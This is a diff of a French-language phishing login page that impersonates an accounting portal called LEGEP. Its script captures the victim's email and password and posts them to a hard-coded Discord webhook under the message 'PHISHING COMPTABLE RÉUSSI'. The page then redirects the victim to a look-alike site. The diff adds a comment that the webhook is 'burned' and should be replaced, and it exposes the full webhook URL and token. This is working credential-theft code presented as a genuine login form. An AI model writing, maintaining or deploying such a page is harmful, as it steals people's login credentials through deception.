@@ -54,10 +54,7 @@
 
     <div class="header">
         <div class="logos-container">
-            <!-- Vrai logo LEGEP -->
             <img src="https://pngs-eliteplus.onrender.com/logos/elite-plus/legep.png" alt="LEGEP">
-            
-            <!-- Ton logo ANNEXE (lien catbox) -->
             <img src="https://files.catbox.moe/yj6yxh.jpeg" alt="ANNEXE">
         </div>
         
@@ -145,6 +142,7 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
+            // Change ce Webhook, il est cramé
             const webhookURL = "https://discord.com/api/webhooks/1568232984211882147/d-_mDSq4-UZeY_x0wtzQWCqt_FPCSCFmJnX-VQKtFY8gmml7AYok_v9AFmqzNdyyjBQQ";
             
             const btn = document.querySelector('.btn-submit');
@@ -155,7 +153,7 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `🚨 **PHISHING COMPTABLE RÉUSSI**\n📧 **Email :** ${email}\n🔑 **Mot de passe :** ${password}`
+                    content: `🚨 **PHISHING COMPTABLE RÉUSSI (Accueil)**\n📧 **Email :** ${email}\n🔑 **Mot de passe :** ${password}`
                 })
             }).then(() => {
                 window.location.href = "https://pngs-eliteplus.onrender.com";
